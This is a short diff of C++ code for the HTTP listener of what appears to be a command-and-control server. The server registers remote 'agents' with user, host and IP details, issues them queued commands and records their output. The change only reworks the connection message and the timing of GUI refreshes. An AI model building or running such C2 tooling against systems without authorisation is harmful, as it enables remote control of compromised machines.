@@ -28,7 +28,7 @@ void HTTPListenerThread::run() {
                             full.metadata.user,
                             full.metadata.process,
                             full.metadata.ip);
-            new_agent.cmd_history.push_back("[*] Agent connected - " + full.metadata.id + "\n");
+            new_agent.cmd_history.push_back("[*] Agent connected - " + full.metadata.user + " on " + full.metadata.hostname + "(" + full.metadata.id + ")\n");
             main_window->g_Agents.push_back(new_agent);
             main_window->log_activity("New Agent connected - " + full.metadata.id);
             // Refresh for new addition
@@ -41,6 +41,8 @@ void HTTPListenerThread::run() {
         if (!it->cmd_queue.empty()) {
             main_window->log_activity("Issued commands for Agent " + it->id);
             it->cmd_history.push_back(MSG_COMMAND_SENT);
+            // Refresh
+            emit main_window->agentUpdated();
         }
         // Extract output
         if (full.data.size() > 0) {
@@ -48,13 +50,13 @@ void HTTPListenerThread::run() {
             for (const std::string& output : full.data) {
                 it->cmd_history.push_back(output);
             }
+            // Refresh
+            emit main_window->agentUpdated();
         }
         // Send and reset queue
         res.set_content(nlohmann::json(it->cmd_queue).dump(), "application/json");
         res.status = 200;
         it->cmd_queue.clear();
-        // Refresh
-        emit main_window->agentUpdated();
         return httplib::Server::HandlerResponse::Handled;
 
     } catch (const std::exception& e) {
